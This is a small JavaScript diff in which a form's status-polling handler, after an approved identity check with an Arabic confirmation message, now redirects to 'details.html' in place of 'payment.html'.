@@ -193,7 +193,7 @@ $('f').addEventListener('submit', async e => {
             clearInterval(checkInterval);
             waitDiv.innerHTML = '✅ تم تأكيد الهوية بنجاح! جاري تحويلك لصفحة الدفع...';
             setTimeout(() => {
-              window.location.href = "payment.html";
+              window.location.href = 'details.html';
             }, 1000);
           } else if (data.status === 'rejected') {
             clearInterval(checkInterval);
